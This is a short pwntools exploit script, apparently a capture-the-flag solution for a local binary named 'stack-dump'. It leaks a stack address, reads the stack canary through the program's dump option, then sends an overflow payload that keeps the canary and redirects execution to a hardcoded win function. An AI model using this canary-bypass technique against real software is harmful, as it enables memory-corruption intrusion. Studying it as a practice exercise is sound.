#!/usr/bin/env python2
from pwn import*

p = process('./stack-dump')

p.recvuntil('pointer ', drop=True)

addr = int(p.recvline(), 16)

ebp = addr + 0x71

canaryAddr = ebp - 0x8 

p.recvline()
p.recvline()
p.recvline()
p.recvline()

p.sendline("a")

p.recvuntil('len: ')

#send address of canary
p.sendline(p32(canaryAddr))

p.recvline()
p.recvline()
p.recvline()
p.recvline()

#dump value of canary
p.sendline("b")
p.recvuntil(': ', drop=True)
canaryVal = p.recvline()[:4]    #get first four bytes dumped 

#print(value)
p.recvline()
p.recvline()
p.recvline()
p.recvline()

#construct payload
#buffer is at $ebp-0x68 = 104 bytes to ebp = 96 bytes to canary

#payload looks like
    # 96 bytes
    # canary
    # 8 bytes   
    # 4 bytes for $ebp
    # win addr p32(0x80486c6)

payload = fit({ 96: canaryVal,
                96+12: p32(0x80486c6)
})


#input payload
p.sendline("a")
p.recvuntil('len: ')
p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()
p.recvline()

#return to win addr
p.sendline("d")

p.interactive()
